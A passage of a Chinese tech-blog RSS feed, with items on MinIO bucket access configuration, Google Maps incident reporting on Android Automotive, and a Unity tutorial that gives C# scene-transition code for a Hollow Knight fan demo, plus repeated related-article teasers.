func base(path string) {// 创建 zip 文件zipFile, err : os.Create("test.zip")if err ! nil {panic(err)}defer zipFile.Close()// 创建一个新的 *Writer 对象zipWriter : zip.NewWriter(zipFile)defer zipWriter.Close()// 创…阅读更多...原理代码解读：基于DiT结构视频生成模型的ControlNetDiffusion Models视频生成-博客汇总 前言：相比于基于UNet结构的视频生成模型，DiT结构的模型最大的劣势在于生态不够完善，配套的ControlNet、IP-Adapter等开源权重不多，导致难以落地。最近DiT-based 5B的ControlNet开源了，相比于传统的ControlNet有不少改进点，这篇博客将从…阅读更多...RabbitMQ 作为消息中间件，实现了支付消息的异步发送和接收， 同步和异步相比 响应速度具体比较在支付场景中&amp;#xff0c;使用 RabbitMQ 实现消息的异步发送和接收与同步处理相比&amp;#xff0c;响应速度和整体系统性能会有显著的不同。以下是同步和异步方式在响应速度上的详细比较&amp;#xff1a;  
1. 同步处理方式 
在同步模式下&amp;#xff0c;支付消息的处理流程通常是&amp;#xf…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:55 +0000</pubDate>
    </item>
    <item>
      <title>基于MinIO配置bucket，用于文件下载和浏览</title>
      <link>https://www.ppmy.cn/news/1540879.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维基于MinIO配置bucket，用于文件下载和浏览news/2025/10/31 23:18:54/文章目录引言I 配置文件浏览安装MinIO配置自启动服务访问权限配置文件浏览访问地址文件下载地址II 知识扩展MinIO内置访问策略只读策略只写策略读写策略diagnosticsconsoleAdmin引言需求：文件下载用于OTA升级，文件浏览用于产品展示。实现方案：基于MinIO配置bucket访问权限。I 配置文件浏览安装MinIOhttps://blog.csdn.net/z929118967/article/details/140466708S3 API 操作 MinIO 服务器端口 :9000 ； 浏览器访问MinIO 控制台端口 :90019000 为API端口9090为控制台端口#!/bin/shexportMINIO_ACCESS_KEY=minioexporthttp://www.ppmy.cn/news/1540879.html相关文章Android Automotive 获得谷歌地图事故报告功能Android Automotive 迎来了谷歌地图的实时事故报告功能&amp;#xff0c;这一更新标志着它与 Android Auto 的功能差距进一步缩小。 Android Auto 主要是通过手机与汽车的连接来提供服务&amp;#xff0c;而Android Automotive 则是为汽车量身定制的系统——这在软件更新和用户体验上带来…阅读更多...[Unity Demo]从零开始制作空洞骑士Hollow Knight第十四集：制作新的场景以及制作创建切换管理系统提示&amp;#xff1a;文章写完后&amp;#xff0c;目录可以自动生成&amp;#xff0c;如何生成可参考右边的帮助文档 文章目录 前言一、制作新的场景 1.重新翻新各种Sprite2.制作地图前期应该做的事情3.疯狂的制作地图二、制作场景切换管理系统 1.制作场景切换点TransitionPoint2.切换场景时的…阅读更多...Android Framework AMS（08）service组件分析-2(startService和StopService关键流程分析)该系列文章总纲链接&amp;#xff1a;专题总纲目录 Android Framework 总纲 本章关键点总结 &amp; 说明&amp;#xff1a; 说明&amp;#xff1a;上一章节主要解读应用层service组件启动的2种方式startService和bindService&amp;#xff0c;以及从APP层到AMS调用之间的打通。本章节主要关注service…阅读更多...深入解析缓存与数据库数据不一致问题缓存层是提高系统响应速度和扩展性的关键组件。然而&amp;#xff0c;缓存层的引入也带来了数据一致性的挑战。 
当数据库中的数据发生变化时&amp;#xff0c;如何确保这些变化能够及时且准确地反映到缓存中&amp;#xff0c;是确保用户体验和系统可靠性的重要问题。 
1. 数据一致性 
首先&amp;am…阅读更多...go压缩的使用基础&amp;#xff1a;使用go创建一个zip 
func base(path string) {// 创建 zip 文件zipFile, err : os.Create("test.zip")if err ! nil {panic(err)}defer zipFile.Close()// 创建一个新的 *Writer 对象zipWriter : zip.NewWriter(zipFile)defer zipWriter.Close()// 创…阅读更多...原理代码解读：基于DiT结构视频生成模型的ControlNetDiffusion Models视频生成-博客汇总 前言：相比于基于UNet结构的视频生成模型，DiT结构的模型最大的劣势在于生态不够完善，配套的ControlNet、IP-Adapter等开源权重不多，导致难以落地。最近DiT-based 5B的ControlNet开源了，相比于传统的ControlNet有不少改进点，这篇博客将从…阅读更多...RabbitMQ 作为消息中间件，实现了支付消息的异步发送和接收， 同步和异步相比 响应速度具体比较在支付场景中&amp;#xff0c;使用 RabbitMQ 实现消息的异步发送和接收与同步处理相比&amp;#xff0c;响应速度和整体系统性能会有显著的不同。以下是同步和异步方式在响应速度上的详细比较&amp;#xff1a;  
1. 同步处理方式 
在同步模式下&amp;#xff0c;支付消息的处理流程通常是&amp;#xf…阅读更多...如何将 ECharts 图表插入 HTML Canvas在 Web 开发中&amp;#xff0c;数据可视化是一个常见且重要的需求。ECharts 是一个强大的图表库&amp;#xff0c;而 HTML5 Canvas 则提供了灵活的绘图能力。今天&amp;#xff0c;我们将探讨如何将这两者结合起来&amp;#xff0c;实现将 ECharts 生成的图表插入到 HTML Canvas 中的特定位置。 
为…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:54 +0000</pubDate>
    </item>
    <item>
      <title>Android Automotive 获得谷歌地图事故报告功能</title>
      <link>https://www.ppmy.cn/news/1540878.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Android Automotive 获得谷歌地图事故报告功能news/2025/10/31 23:18:53/Android Automotive 迎来了谷歌地图的实时事故报告功能，这一更新标志着它与 Android Auto 的功能差距进一步缩小。Android Auto 主要是通过手机与汽车的连接来提供服务，而Android Automotive 则是为汽车量身定制的系统——这在软件更新和用户体验上带来了一些独特的挑战。今年7月，谷歌宣布计划将实时事故报告功能扩展到 Android Auto 和 Automotive，尽管 Android Automotive 的更新在谷歌地图中的推出稍显滞后。事故报告功能最初在谷歌地图上推出已有数年，但遗憾的是，最初它仅限于移动设备使用。然而，随着时间的推移，谷歌在7月将这一功能带到了 car play 车载系统中。不久之后，该功能宣布将进入印度市场，并预计将逐步推广至全球。在使用谷歌地图时，点击界面上显眼的黄色危险三角形图标，即可召唤出侧边栏。用户可以在这里报告各种事故，包括但不限于车祸、交通拥堵、道路施工、车道封闭、车辆抛锚、路上的障碍物，甚至是移动测速摄像头。根据测试体验，每条道路似乎只能报告一次。这项新功能的加入，无疑将极大提升 Android Automotive 用户的驾驶体验，使他们能够更快捷、更准确地获取和分享实时道路信息，从而做出更明智的行车决策。http://www.ppmy.cn/news/1540878.html相关文章[Unity Demo]从零开始制作空洞骑士Hollow Knight第十四集：制作新的场景以及制作创建切换管理系统提示&amp;#xff1a;文章写完后&amp;#xff0c;目录可以自动生成&amp;#xff0c;如何生成可参考右边的帮助文档 文章目录 前言一、制作新的场景 1.重新翻新各种Sprite2.制作地图前期应该做的事情3.疯狂的制作地图二、制作场景切换管理系统 1.制作场景切换点TransitionPoint2.切换场景时的…阅读更多...Android Framework AMS（08）service组件分析-2(startService和StopService关键流程分析)该系列文章总纲链接&amp;#xff1a;专题总纲目录 Android Framework 总纲 本章关键点总结 &amp; 说明&amp;#xff1a; 说明&amp;#xff1a;上一章节主要解读应用层service组件启动的2种方式startService和bindService&amp;#xff0c;以及从APP层到AMS调用之间的打通。本章节主要关注service…阅读更多...深入解析缓存与数据库数据不一致问题缓存层是提高系统响应速度和扩展性的关键组件。然而&amp;#xff0c;缓存层的引入也带来了数据一致性的挑战。 
当数据库中的数据发生变化时&amp;#xff0c;如何确保这些变化能够及时且准确地反映到缓存中&amp;#xff0c;是确保用户体验和系统可靠性的重要问题。 
1. 数据一致性 
首先&amp;am…阅读更多...go压缩的使用基础&amp;#xff1a;使用go创建一个zip 
func base(path string) {// 创建 zip 文件zipFile, err : os.Create("test.zip")if err ! nil {panic(err)}defer zipFile.Close()// 创建一个新的 *Writer 对象zipWriter : zip.NewWriter(zipFile)defer zipWriter.Close()// 创…阅读更多...原理代码解读：基于DiT结构视频生成模型的ControlNetDiffusion Models视频生成-博客汇总 前言：相比于基于UNet结构的视频生成模型，DiT结构的模型最大的劣势在于生态不够完善，配套的ControlNet、IP-Adapter等开源权重不多，导致难以落地。最近DiT-based 5B的ControlNet开源了，相比于传统的ControlNet有不少改进点，这篇博客将从…阅读更多...RabbitMQ 作为消息中间件，实现了支付消息的异步发送和接收， 同步和异步相比 响应速度具体比较在支付场景中&amp;#xff0c;使用 RabbitMQ 实现消息的异步发送和接收与同步处理相比&amp;#xff0c;响应速度和整体系统性能会有显著的不同。以下是同步和异步方式在响应速度上的详细比较&amp;#xff1a;  
1. 同步处理方式 
在同步模式下&amp;#xff0c;支付消息的处理流程通常是&amp;#xf…阅读更多...如何将 ECharts 图表插入 HTML Canvas在 Web 开发中&amp;#xff0c;数据可视化是一个常见且重要的需求。ECharts 是一个强大的图表库&amp;#xff0c;而 HTML5 Canvas 则提供了灵活的绘图能力。今天&amp;#xff0c;我们将探讨如何将这两者结合起来&amp;#xff0c;实现将 ECharts 生成的图表插入到 HTML Canvas 中的特定位置。 
为…阅读更多...docker 文件目录迁移文章参考 
du -hs /var/lib/docker/ 命令查看磁盘使用情况。 
du -hs /var/lib/docker/docker system df命令&amp;#xff0c;类似于Linux上的df命令&amp;#xff0c;用于查看Docker的磁盘使用情况: 
rootnn0:~$ docker system df
TYPE TOTAL ACTIVE SIZE RECLAIMABLE
Images 7 2 122.2…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:53 +0000</pubDate>
    </item>
    <item>
      <title>[Unity Demo]从零开始制作空洞骑士Hollow Knight第十四集：制作新的场景以及制作创建切换管理系统</title>
      <link>https://www.ppmy.cn/news/1540877.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维[Unity Demo]从零开始制作空洞骑士Hollow Knight第十四集：制作新的场景以及制作创建切换管理系统news/2025/10/31 23:18:52/提示：文章写完后，目录可以自动生成，如何生成可参考右边的帮助文档文章目录前言一、制作新的场景1.重新翻新各种Sprite2.制作地图前期应该做的事情3.疯狂的制作地图二、制作场景切换管理系统1.制作场景切换点TransitionPoint2.切换场景时的脚本逻辑处理总结前言hello大家好久没见，之所以隔了这么久才更新并不是因为我又放弃了这个项目，而是接下来要制作的工作太忙碌了，每次我都花了很长的时间解决完一个部分，然后就没力气打开CSDN写文章就直接睡觉去了，现在终于有时间整理下我这半个月都做了什么内容，其实不看我上一篇文章都没发觉我的进程已经快了这么多啊，那么我就顺着上一篇文章开讲现在完成的场景转换系统吧。顺便提醒，我的Github已经更新了，想要查看最新的内容话请到我的Github主页下载工程吧：GitHub - ForestDango/Hollow-Knight-Demo: A new Hollow Knight Demo after 2 years!一、制作新的场景1.重新翻新各种Sprite如果你还记得我之前讲过有关tk2dSpirte的时候，我的很多图都是直接PS扣下来的，因此不仅图像模糊，还可能会漏动画帧的情况，这里我们就对之前讲过的一些要用到的tk2dSpirte重新制作，步骤都是一样的，删除原本tk2dSpirte里面的sprite，把我们新搞到手的sprite拖进去然后commit提交，重新制作动画：说个搞笑的我之前的waterdrip没扣干净会有马赛克，现在我们终于有了一手新的waterdrip的Sprite：这个生命水之前也没有扣干净。。而且动画还很鬼畜，这下问题都解决了然后再重新制作他们的动画就好了2.制作地图前期应该做的事情接下来就是要制作我们游戏主角的城镇德特茅斯，我们就创建一个新的场景名字就叫Town，添加场景后的第一件事情就是导入到Build Setting中：然后我们就可以使用tk2dTilemap来制作地图基本的模样了：为了效率，我把Tilemap里面的Tile Properties的Size调整成64x64了，这样方便我们更快的画地图：3.疯狂的制作地图有了这个tilemap我们很好的画出了一个地图基本的模样以及地图基本的碰撞框。你已经学会了怎么绘制一张图前期该做的事了，首先创建一个原点位置的游戏对象_Scenery,然后就是疯狂的制作，疯狂的堆叠素材，下面试着画出这样的地图吧：对于城镇，我们少见的可交互对象只有草，还有NPC和几个房屋，但这些我都还没做到，所以我等着后面做UI的时候再着手制作吧。还有别忘了添加Directional Light让场景亮起来。二、制作场景切换管理系统1.制作场景切换点TransitionPoint我们打算做的事情就是在场景的每个门的位置，不管它是上下左右，是真正的门还是虚空的门，我们都用一个TransitionPoint来管理他们，OK话不多说开始吧，首先回到我们之前创建的场景教学关Tutorial_01:中，在出口的转移点，初始的转移点，和隐藏的转移点添加好一个TransitionPoint.cs，而且它们需要亮光来引导玩家往这走，同时它们也能是碰刺复活hazardRespawn的复活点，而且它们还要能阻止敌人往这边走（就是怕敌人掉出地图外了的意思）这里就以门后的转移点为例，这个转移点就是到Town的，然后它的三个子对象分别实现我上述的三个功能。脚本方面我们创建名字叫TransitionPoint .cs：using System;
using System.Collections.Generic;
using GlobalEnums;
using UnityEngine;
using UnityEngine.Audio;public class TransitionPoint : MonoBehaviour
{private GameManager gm;private PlayerData playerData;private bool activated;[Header("Door Type Gate Settings")][Space(5f)]public bool isADoor; //是否是个门，意思是当你到传送点的时候还需要UI提示后按键输入才能触发转移public bool dontWalkOutOfDoor; //不要走出门[Header("Gate Entry")][Tooltip("The wait time before entering from this gate (not the target gate).")]public float entryDelay; //转移后的延迟public bool alwaysEnterRight; //进入这个转移点总是朝右看public bool alwaysEnterLeft; //进入这个转移点总是朝左看[Header("Force Hard Land (Top Gates Only)")][Space(5f)]public bool hardLandOnExit; //强制重着地[Header("Destination Scene")][Space(5f)]public string targetScene; //目标场景public string entryPoint; //进入的点public Vector2 entryOffset; //进入时的偏移量[SerializeField] private bool alwaysUnloadUnusedAssets;public PlayMakerFSM customFadeFSM; //自定义Fade的playmakerFSM[Header("Hazard Respawn")][Space(5f)]public bool nonHazardGate; //这个门不能用来做HazardRespawn的重生点public HazardRespawnMarker respawnMarker;[Header("Set Audio Snapshots")][Space(5f)]public AudioMixerSnapshot atmosSnapshot;public AudioMixerSnapshot enviroSnapshot;public AudioMixerSnapshot actorSnapshot;public AudioMixerSnapshot musicSnapshot;private Color myGreen = new Color(0f, 0.8f, 0f, 0.5f);private static List&lt;TransitionPoint&gt; transitionPoints;public static string lastEntered = ""; //记录最后进入的TransitionPointpublic delegate void BeforeTransitionEvent();public event BeforeTransitionEvent OnBeforeTransition;public static List&lt;TransitionPoint&gt; TransitionPoints{get{return transitionPoints;}}[RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.BeforeSceneLoad)]private static void Init(){transitionPoints = new List&lt;TransitionPoint&gt;();}protected void Awake(){transitionPoints.Add(this);}protected void OnDestroy(){transitionPoints.Remove(this);}private void Start(){gm = GameManager.instance;playerData = PlayerData.instance;if(!nonHazardGate &amp;&amp; respawnMarker == null){Debug.LogError(string.Concat(new string[]{"Transition Gate ",name," in ",gm.sceneName," does not have its respawn marker set in inspector."}));}}private void OnTriggerEnter2D(Collider2D movingObj){
//判断碰撞对象是否是Player的layerif(!isADoor &amp;&amp; movingObj .gameObject.layer == 9 &amp;&amp; gm.gameState == GameState.PLAYING){if(!string.IsNullOrEmpty(targetScene) &amp;&amp; !string.IsNullOrEmpty(entryPoint)){if (customFadeFSM){customFadeFSM.SendEvent("FADE");}if (atmosSnapshot != null){atmosSnapshot.TransitionTo(1.5f);}if (enviroSnapshot != null){enviroSnapshot.TransitionTo(1.5f);}if (actorSnapshot != null){actorSnapshot.TransitionTo(1.5f);}if (musicSnapshot != null){musicSnapshot.TransitionTo(1.5f);}activated = true;lastEntered = gameObject.name;if (OnBeforeTransition != null){OnBeforeTransition();}return;}Debug.LogError(gm.sceneName + " " + name + " no target scene has been set on this gate.");}}private void OnTriggerStay2D(Collider2D movingObj){if (!activated){OnTriggerEnter2D(movingObj);}}private void OnDrawGizmos(){if (transform != null){Vector3 position = transform.position + new Vector3(0f, GetComponent&lt;BoxCollider2D&gt;().bounds.extents.y + 1.5f, 0f);GizmoUtility.DrawText(GUI.skin, targetScene, position, new Color?(myGreen), 10, 0f);}}/// &lt;summary&gt;/// 获取当前门的位置，请注意你的TransitionPoint名字一定要有如下字段/// &lt;/summary&gt;/// &lt;returns&gt;&lt;/returns&gt;public GatePosition GetGatePosition(){string name = base.name;if (name.Contains("top")){return GatePosition.top;}if (name.Contains("right")){return GatePosition.right;}if (name.Contains("left")){return GatePosition.left;}if (name.Contains("bot")){return GatePosition.bottom;}if (name.Contains("door") || isADoor){return GatePosition.door;}Debug.LogError("Gate name " + name + "does not conform to a valid gate position type. Make sure gate name has the form 'left1'");return GatePosition.unknown;}public void SetTargetSceneName(string newScene){targetScene = newScene;}}然后我们就要给TransitionPoint设置好对应的layer，以及什么能和这个layer发生碰撞检测：设置好对应的参数：回到Town创建中我们也来创建对应的TransitionPoint:看到这里，你是否发现有什么不对劲？第一，你就给两个TransitionPoint，我的SceneManager.LoadScene()呢？关有转移点没有转移有嘛用，第二，你的Tutorial_01的转移点在那个门后面，游戏里面都是打了几下门直接就到了Town场景根本就不用走过去，这就引出了我们下面要介绍的切换场景时的脚本逻辑处理2.切换场景时的脚本逻辑处理首先我们处理场景转换要用到SceneLoad.cs脚本，我们把切换创建分为六个阶段，分别代表六个事件：FetchComplete -&gt; WillActivate -&gt;  ActivationComplete -&gt;   Complete -&gt;  StartCalled  -&gt; Finishusing System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;public class SceneLoad
{public bool IsFetchAllowed { get; set; } //是否允许获取下一个场景public bool IsActivationAllowed { get; set; } //是否允许激活创建public bool IsUnloadAssetsRequired { get; set; } //是否需要卸载掉当前场景的Assetspublic float BeginTime { get; set; } //开启时间public bool IsGarbageCollectRequired { get; set; } //是否需要GC垃圾回收public delegate void FetchCompleteDelegate(); public event FetchCompleteDelegate FetchComplete;public delegate void WillActivateDelegate();public event WillActivateDelegate WillActivate;public delegate void ActivationCompleteDelegate();public event ActivationCompleteDelegate ActivationComplete;public delegate void CompleteDelegate();public event CompleteDelegate Complete;public delegate void StartCalledDelegate();public event StartCalledDelegate StartCalled;public delegate void FinishDelegate();public event FinishDelegate Finish;private readonly MonoBehaviour runner;private readonly string targetSceneName;public const int PhaseCount = 8;private readonly PhaseInfo[] phaseInfos;public bool IsFinished { get; private set; }public SceneLoad(MonoBehaviour runner,string targetSceneName){this.runner = runner;this.targetSceneName = targetSceneName;phaseInfos = new PhaseInfo[PhaseCount];for (int i = 0; i &lt; PhaseCount; i++){phaseInfos[i] = new PhaseInfo{BeginTime = null};}}public void Begin(){runner.StartCoroutine(BeginRoutine());}private IEnumerator BeginRoutine(){RecordBeginTime(Phases.FetchBlocked);while (!IsFetchAllowed){yield return null;}RecordEndTime(Phases.FetchBlocked);RecordBeginTime(Phases.Fetch);AsyncOperation loadOperation = UnityEngine.SceneManagement.SceneManager.LoadSceneAsync(targetSceneName, UnityEngine.SceneManagement.LoadSceneMode.Additive);loadOperation.allowSceneActivation = true;while(loadOperation.progress &lt; 0.9f){yield return null;}RecordEndTime(Phases.Fetch);if (FetchComplete != null){try{FetchComplete();}catch (Exception exception){Debug.LogError("Exception in responders to SceneLoad.FetchComplete. Attempting to continue load regardless.");Debug.LogException(exception);}}RecordBeginTime(Phases.ActivationBlocked);while (!IsActivationAllowed){yield return null;}RecordEndTime(Phases.ActivationBlocked);RecordBeginTime(Phases.Activation);if(WillActivate != null){try{WillActivate();}catch (Exception exception2){Debug.LogError("Exception in responders to SceneLoad.WillActivate. Attempting to continue load regardless.");Debug.LogException(exception2);}}loadOperation.allowSceneActivation = true;yield return loadOperation;RecordEndTime(Phases.Activation);if(ActivationComplete != null){try{ActivationComplete();}catch (Exception exception3){Debug.LogError("Exception in responders to SceneLoad.ActivationComplete. Attempting to continue load regardless.");Debug.LogException(exception3);}}RecordBeginTime(Phases.UnloadUnusedAssets);if (IsUnloadAssetsRequired){AsyncOperation asyncOperation = Resources.UnloadUnusedAssets();yield return asyncOperation;}RecordEndTime(Phases.UnloadUnusedAssets);RecordBeginTime(Phases.GarbageCollect);if (IsGarbageCollectRequired){}RecordEndTime(Phases.GarbageCollect);if(Complete != null){try{Complete();}catch (Exception exception4){Debug.LogError("Exception in responders to SceneLoad.Complete. Attempting to continue load regardless.");Debug.LogException(exception4);}}RecordBeginTime(Phases.StartCall);yield return null;RecordEndTime(Phases.StartCall);if (StartCalled != null){try{StartCalled();}catch (Exception exception5){Debug.LogError("Exception in responders to SceneLoad.StartCalled. Attempting to continue load regardless.");Debug.LogException(exception5);}}IsFinished = true;if (Finish != null){try{Finish();yield break;}catch (Exception exception8){Debug.LogError("Exception in responders to SceneLoad.Finish. Attempting to continue load regardless.");Debug.LogException(exception8);yield break;}}}/// &lt;summary&gt;/// 记录开启转移的时间/// &lt;/summary&gt;/// &lt;param name="phase"&gt;&lt;/param&gt;private void RecordBeginTime(Phases phase){phaseInfos[(int)phase].BeginTime = new float?(Time.realtimeSinceStartup);}/// &lt;summary&gt;/// 记录结束转移后的时间/// &lt;/summary&gt;/// &lt;param name="phase"&gt;&lt;/param&gt;private void RecordEndTime(Phases phase){phaseInfos[(int)phase].EndTime = new float?(Time.realtimeSinceStartup);}private class PhaseInfo{public float? BeginTime;public float? EndTime;}public enum Phases{FetchBlocked,Fetch,ActivationBlocked,Activation,UnloadUnusedAssets,GarbageCollect,StartCall,LoadBoss}
}在TransitionPoint.cs的Trigger2D函数中，我们来写新的内容：private void OnTriggerEnter2D(Collider2D movingObj){if(!isADoor &amp;&amp; movingObj .gameObject.layer == 9 &amp;&amp; gm.gameState == GameState.PLAYING){if(!string.IsNullOrEmpty(targetScene) &amp;&amp; !string.IsNullOrEmpty(entryPoint)){if (customFadeFSM){customFadeFSM.SendEvent("FADE");}if (atmosSnapshot != null){atmosSnapshot.TransitionTo(1.5f);}if (enviroSnapshot != null){enviroSnapshot.TransitionTo(1.5f);}if (actorSnapshot != null){actorSnapshot.TransitionTo(1.5f);}if (musicSnapshot != null){musicSnapshot.TransitionTo(1.5f);}activated = true;lastEntered = gameObject.name;if (OnBeforeTransition != null){OnBeforeTransition();}gm.BeginSceneTransiton(new GameManager.SceneLoadInfo{SceneName = targetScene,EntryGateName = entryPoint,HeroLeaveDirection = new GatePosition?(GetGatePosition()),EntryDelay = entryDelay,WaitForSceneTransitionCameraFade = true,PreventCameraFadeOut = (customFadeFSM != null),Visualization = sceneLoadVisualization,AlwaysUnloadUnusedAssets = alwaysUnloadUnusedAssets,forceWaitFetch = forceWaitFetch});return;}Debug.LogError(gm.sceneName + " " + name + " no target scene has been set on this gate.");}}回到GameManager.cs中，我们创建一个类SceneLoadInfo来对应SceneLoad:以及还有一些和场景转换相关的变量public class GameManager : MonoBehaviour
{
...........public bool startedOnThisScene = true;public float sceneWidth;//场景宽度public float sceneHeight;//场景高度public tk2dTileMap tilemap{ get; private set; }private static readonly string[] SubSceneNameSuffixes = new string[]{"_boss_defeated","_boss","_preload"};private SceneLoad sceneLoad;public bool RespawningHero { get; set; }public bool IsInSceneTransition { get; private set; }private bool isLoading;private int sceneLoadsWithoutGarbageCollect;private SceneLoadVisualizations loadVisualization;[Space]public string sceneName; //当前场景public string nextSceneName; //下一个场景public string entryGateName; //进入的门的名字（top,bot,left,right）private string targetScene; //目标创建private float entryDelay; //进入延迟private bool hasFinishedEnteringScene; //是否完成了进入场景的整套行为public bool HasFinishedEnteringScene{get{return hasFinishedEnteringScene;}}private bool waitForManualLevelStart;public delegate void SceneTransitionBeganDelegate(SceneLoad sceneLoad);public static event SceneTransitionBeganDelegate SceneTransitionBegan;public delegate void SceneTransitionFinishEvent();public event SceneTransitionFinishEvent OnFinishedSceneTransition;public delegate void UnloadLevel();public event UnloadLevel UnloadingLevel;public delegate void EnterSceneEvent();public event EnterSceneEvent OnFinishedEnteringScene;
...........public class SceneLoadInfo{public bool IsFirstLevelForPlayer;public string SceneName;public GatePosition? HeroLeaveDirection;public string EntryGateName;public float EntryDelay;public bool PreventCameraFadeOut;public bool WaitForSceneTransitionCameraFade;public SceneLoadVisualizations Visualization;public bool AlwaysUnloadUnusedAssets;public bool forceWaitFetch;public virtual void NotifyFetchComplete(){}public virtual bool IsReadyToActivate(){return true;}public virtual void NotifyFinished(){}public enum SceneLoadVisualizations{Default, //默认Custom = -1, //自定义Dream = 1, //梦境Colosseum, //斗兽场GrimmDream, //格林梦境ContinueFromSave, //从保存的数据中继续GodsAndGlory //神居}
}我们来实现BeginSceneTransition方法：public void BeginSceneTransition(SceneLoadInfo info){if(info.IsFirstLevelForPlayer){}Debug.LogFormat("BeginSceneTransiton EntryGateName =" + info.EntryGateName);StartCoroutine(BeginSceneTransitionRoutine(info));}private IEnumerator BeginSceneTransitionRoutine(SceneLoadInfo info){if (sceneLoad != null){Debug.LogErrorFormat(this, "Cannot scene transition to {0}, while a scene transition is in progress", new object[]{info.SceneName});yield break;}IsInSceneTransition = true;sceneLoad = new SceneLoad(this, info.SceneName);isLoading = true;loadVisualization = info.Visualization;if (hero_ctrl != null){hero_ctrl.proxyFSM.SendEvent("HeroCtrl-LeavingScene");hero_ctrl.SetHeroParent(null);}if (!info.IsFirstLevelForPlayer){NoLongerFirstGame();}SaveLevelState();SetState(GameState.EXITING_LEVEL);entryGateName = info.EntryGateName ?? "";targetScene = info.SceneName;if (hero_ctrl != null){hero_ctrl.LeaveScene(info.HeroLeaveDirection);}if (!info.PreventCameraFadeOut){cameraCtrl.FreezeInPlace(true);cameraCtrl.FadeOut(CameraFadeType.LEVEL_TRANSITION);}startedOnThisScene = false;nextSceneName = info.SceneName;waitForManualLevelStart = true;if (UnloadingLevel != null){UnloadingLevel();}string lastSceneName = UnityEngine.SceneManagement.SceneManager.GetActiveScene().name;sceneLoad.FetchComplete += delegate (){info.NotifyFetchComplete();};sceneLoad.WillActivate += delegate (){entryDelay = info.EntryDelay;};sceneLoad.ActivationComplete += delegate (){UnityEngine.SceneManagement.SceneManager.UnloadScene(lastSceneName);RefreshTilemapInfo(info.SceneName);sceneLoad.IsUnloadAssetsRequired = (info.AlwaysUnloadUnusedAssets || IsUnloadAssetsRequired(lastSceneName, info.SceneName));bool flag2 = false;if (!sceneLoad.IsUnloadAssetsRequired){float? beginTime = sceneLoad.BeginTime;if (beginTime != null &amp;&amp; Time.realtimeSinceStartup - beginTime.Value &gt; 0f &amp;&amp; sceneLoadsWithoutGarbageCollect &lt; 0f){flag2 = false;}}if (flag2){sceneLoadsWithoutGarbageCollect = 0;}else{sceneLoadsWithoutGarbageCollect++;}sceneLoad.IsGarbageCollectRequired = flag2;};sceneLoad.Complete += delegate (){SetupSceneRefs(false);BeginScene();};sceneLoad.Finish += delegate (){sceneLoad = null;isLoading = false;waitForManualLevelStart = false;info.NotifyFetchComplete();OnNextLevelReady();IsInSceneTransition = false;if (OnFinishedSceneTransition != null){OnFinishedSceneTransition();}};if(SceneTransitionBegan != null){try{SceneTransitionBegan(sceneLoad);}catch (Exception exception){Debug.LogError("Exception in responders to GameManager.SceneTransitionBegan. Attempting to continue load regardless.");Debug.LogException(exception);}}sceneLoad.IsFetchAllowed = (!info.forceWaitFetch &amp;&amp; (info.PreventCameraFadeOut));sceneLoad.IsActivationAllowed = false;sceneLoad.Begin();float cameraFadeTimer = 